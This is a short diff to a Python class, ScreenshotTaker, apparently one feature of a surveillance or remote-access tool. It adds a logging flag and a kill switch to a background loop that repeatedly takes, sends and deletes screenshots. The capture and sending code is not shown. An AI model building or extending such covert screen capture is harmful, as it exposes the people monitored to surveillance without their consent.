@@ -10,8 +10,8 @@ from exceptions import PoganException
 
 
 class ScreenshotTaker(PoganFeature):
-    def __init__(self, screenshot_filename: str, filename: str, log_dir: str):
-        super().__init__("[Screenshot Taker]", filename, log_dir)
+    def __init__(self, screenshot_filename: str, filename: str, log_dir: str, log=True):
+        super().__init__("[Screenshot Taker]", filename, log_dir, log)
 
         self.screenshot_filename = screenshot_filename
         self.runner_thread = Thread(target=self.screenshot_manager)
@@ -20,10 +20,13 @@ class ScreenshotTaker(PoganFeature):
         self.runner_thread.start()
 
     def clean(self):
-        self.runner_thread.join()
+        self.kill = True
 
     def screenshot_manager(self):
         while True:
+            if self.kill:
+                break
+
             self.take_screenshot()
             self.send_screenshot()
             self.delete_screenshot()
